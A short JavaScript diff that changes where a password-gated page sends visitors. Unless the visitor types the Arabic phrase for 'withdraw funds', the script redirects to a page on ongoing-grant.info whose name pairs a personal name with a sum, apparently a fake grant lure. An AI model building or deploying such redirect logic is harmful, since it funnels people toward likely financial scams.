@@ -6,5 +6,5 @@ password = prompt(
 );
 
 if (password !== 'سحب الأموال') {
-    location.href = 'https://ongoing-grant.info/Boua-Matou-Um35,000.html';
+    location.href = 'https://ongoing-grant.info/Laid-Be-Namor-30,000.html';
 }
